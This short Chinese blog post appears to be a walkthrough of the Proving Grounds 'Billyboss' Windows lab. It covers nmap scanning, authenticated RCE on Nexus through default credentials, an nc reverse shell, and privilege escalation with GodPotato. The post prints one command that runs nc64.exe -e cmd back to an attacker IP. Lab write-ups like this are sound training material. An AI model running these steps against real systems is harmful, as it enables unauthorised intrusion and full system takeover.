---
title: Proving Grounds Practice-Billyboss-Windows
date: 2025-7-01 20:00:00
tags: 红队
categories: 红队打靶-Windows
---

# 信息收集

## nmap

![image-20250701151820117](./Billyboss-Windows/image-20250701151820117.png)

# nexus漏洞利用

![image-20250701154554349](./Billyboss-Windows/image-20250701154554349.png)

该版本存在经过身份验证的远程代码执行

上网搜索nexus的默认密码，最终尝试出来密码为`nexus:nexus`

先上传nc.exe,然后利用nc反弹shell

![image-20250701154815970](./Billyboss-Windows/image-20250701154815970.png)

![image-20250701155009073](./Billyboss-Windows/image-20250701155009073.png)

![image-20250701155021549](./Billyboss-Windows/image-20250701155021549.png)

# 提权

可以通过该权限来提权,工具来源：

[BeichenDream/GodPotato --- BeichenDream/GodPotato](./https://github.com/BeichenDream/GodPotato)

![image-20250701162039996](./Billyboss-Windows/image-20250701162039996.png)

![image-20250701161945997](./Billyboss-Windows/image-20250701161945997.png)

通过该工具来运行nc反弹shell

```
GodPotato-NET4.exe -cmd "cmd /c C:\Users\nathan\Nexus\nexus-3.21.0-05\nc64.exe -e cmd 192.168.45.151 81"
```

![image-20250701162439296](./Billyboss-Windows/image-20250701162439296.png)